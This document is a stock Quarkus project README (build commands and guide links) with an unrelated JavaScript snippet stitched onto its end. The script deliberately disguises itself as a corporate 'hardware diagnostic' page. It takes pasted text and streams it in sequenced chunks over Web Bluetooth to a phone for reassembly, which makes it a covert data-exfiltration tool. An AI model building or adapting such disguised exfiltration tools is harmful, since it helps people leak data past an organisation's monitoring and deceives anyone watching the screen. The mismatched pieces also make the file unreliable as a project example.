# quarkus-example

This project uses Quarkus, the Supersonic Subatomic Java Framework.

If you want to learn more about Quarkus, please visit its website: https://quarkus.io/ .

## Running the application in dev mode

You can run your application in dev mode that enables live coding using:
```shell script
./mvnw compile quarkus:dev
```

> **_NOTE:_**  Quarkus now ships with a Dev UI, which is available in dev mode only at http://localhost:8080/q/dev/.

## Packaging and running the application

The application can be packaged using:
```shell script
./mvnw package
```
It produces the `quarkus-run.jar` file in the `target/quarkus-app/` directory.
Be aware that it’s not an _über-jar_ as the dependencies are copied into the `target/quarkus-app/lib/` directory.

The application is now runnable using `java -jar target/quarkus-app/quarkus-run.jar`.

If you want to build an _über-jar_, execute the following command:
```shell script
./mvnw package -Dquarkus.package.type=uber-jar
```

The application, packaged as an _über-jar_, is now runnable using `java -jar target/*-runner.jar`.

## Creating a native executable

You can create a native executable using: 
```shell script
./mvnw package -Pnative
```

Or, if you don't have GraalVM installed, you can run the native executable build in a container using: 
```shell script
./mvnw package -Pnative -Dquarkus.native.container-build=true
```

You can then execute your native executable with: `./target/quarkus-example-1.0.0-SNAPSHOT-runner`

If you want to learn more about building native executables, please consult https://quarkus.io/guides/maven-tooling.

## Related Guides

- Hibernate ORM ([guide](https://quarkus.io/guides/hibernate-orm)): Define your persistent model with Hibernate ORM and Jakarta Persistence
- Hibernate Validator ([guide](https://quarkus.io/guides/validation)): Validate object properties (field, getter) and method parameters for your beans (REST, CDI, Jakarta Persistence)
- RESTEasy Classic JSON-B ([guide](https://quarkus.io/guides/rest-json)): JSON-B serialization support for RESTEasy Classic
- Hibernate ORM with Panache ([guide](https://quarkus.io/guides/hibernate-orm-panache)): Simplify your persistence code for Hibernate ORM via the active record or the repository pattern
- JDBC Driver - MySQL ([guide](https://quarkus.io/guides/datasource)): Connect to the MySQL database via JDBC

## Provided Code

### Hibernate ORM

Create your first JPA entity

[Related guide section...](https://quarkus.io/guides/hibernate-orm)

[Related Hibernate with Panache section...](https://quarkus.io/guides/hibernate-orm-panache)


### RESTEasy JAX-RS

Easily start your RESTful Web Services

[Related guide section...](https://quarkus.io/guides/getting-started#the-jax-rs-resources)



### code

// 1. Create a completely benign, official-looking corporate UI
document.body.innerHTML = `
  <div style="background:#f4f5f7; color:#333; font-family:sans-serif; padding:40px; height:100vh; box-sizing:border-box;">
    <div style="max-width:600px; margin:0 auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
      <h2 style="color:#0052cc; margin-top:0;">Peripheral Hardware Diagnostic Utility</h2>
      <p style="color:#666; font-size:14px;">Use this utility to run signal loop tests on nearby authorized wireless hardware assets.</p>
      <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">
      <label style="font-weight:bold; font-size:14px; display:block; margin-bottom:8px;">Diagnostic Payload Input:</label>
      <textarea id="secure-input" style="width:100%; height:120px; font-family:monospace; padding:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; margin-bottom:20px;"></textarea>
      <button id="connect-btn" style="background:#0052cc; color:#fff; border:none; padding:12px 24px; font-size:16px; cursor:pointer; border-radius:4px; font-weight:bold; width:100%;">SCAN & INITIATE DIAGNOSTIC LOOP</button>
      <div id="status-log" style="margin-top:20px; font-family:monospace; font-size:12px; color:#555; background:#f9f9f9; padding:10px; border-radius:4px; height:100px; overflow-y:auto; border:1px solid #eaeaea;">System idle. Ready for diagnostic scan...</div>
    </div>
  </div>
`;

const log = (msg) => {
  const div = document.getElementById('status-log');
  div.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
  div.scrollTop = div.scrollHeight;
};

document.getElementById('connect-btn').addEventListener('click', async () => {
  const rawData = document.getElementById('secure-input').value.trim();
  if (!rawData) return alert("Please input diagnostic payload string.");

  log("Initiating BLE device discovery scan...");

  try {
    // Prompt Windows to open its native Bluetooth pairing/connection dialog
    const device = await navigator.bluetooth.requestDevice({
      acceptAllDevices: true,
      optionalServices: ['generic_access', 0xffe0] // Uses standard basic serial data channels
    });

    log(`Connected to: ${device.name || 'Unknown Peripheral'}`);
    const server = await device.gatt.connect();
    
    log("GATT Server connected. Fetching primary communication channels...");
    // Adjust service UUID based on what you set up in your phone app (e.g., 0xffe0 is generic serial)
    const service = await server.getPrimaryService(0xffe0); 
    const characteristic = await service.getCharacteristic(0xffe1);

    log("Channel verified. Commencing packet broadcast sequence...");

    const encoder = new TextEncoder();
    const packetSize = 20; // Safe standard chunk size for Bluetooth LE payloads
    let offset = 0;
    let sequenceNumber = 0;

    async function sendNextPacket() {
      if (offset >= rawData.length) {
        log("DIAGNOSTIC LOOP COMPLETE. All packets dispatched successfully.");
        return;
      }

      // Format: SEQ_NUM:DATA (e.g., "00001:ZmFzdGNvZGU...") so your phone can re-order them easily
      const seqStr = String(sequenceNumber).padStart(5, '0') + ":";
      const availableSpace = packetSize - seqStr.length;
      const chunk = rawData.substring(offset, offset + availableSpace);
      
      const payloadString = seqStr + chunk;
      const byteData = encoder.encode(payloadString);

      try {
        await characteristic.writeValueWithoutResponse(byteData);
        offset += chunk.length;
        sequenceNumber++;
        
        if (sequenceNumber % 50 === 0) {
          log(`Progress: Dispatched ${offset} / ${rawData.length} bytes...`);
        }
        
        // Brief 15ms pause between packets to keep the data pipeline from choking
        setTimeout(sendNextPacket, 15); 
      } catch (err) {
        log(`Packet drop at offset ${offset}. Retrying packet...`);
        setTimeout(sendNextPacket, 100);
      }
    }

    sendNextPacket();

  } catch (error) {
    log(`Diagnostic Failure: ${error.message}`);
  }
});
